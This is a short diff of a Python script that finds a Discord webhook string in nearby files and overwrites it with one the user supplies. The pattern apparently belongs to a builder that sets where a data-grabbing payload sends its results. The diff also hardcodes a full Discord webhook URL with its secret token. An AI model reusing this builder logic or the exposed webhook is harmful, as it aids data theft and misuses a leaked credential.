@@ -58,7 +58,7 @@ while True:
         filepath = os.path.join(os.getcwd(), filename)
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
-        new_content = content.replace('"WEBHOOK HERE"', f'"{webhook}"')
+        new_content = content.replace('"https://discord.com/api/webhooks/1106237813256626307/d3EYpbev098VSSQ2a0qS_1FCqKImQMTfOYLe13yrVrT5gW7XUF9p7_q8Lkgh2yh7-3YY"', f'"{webhook}"')
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(new_content)
         Write.Print(f"\n{filename} file updated.", Colors.red_to_yellow)
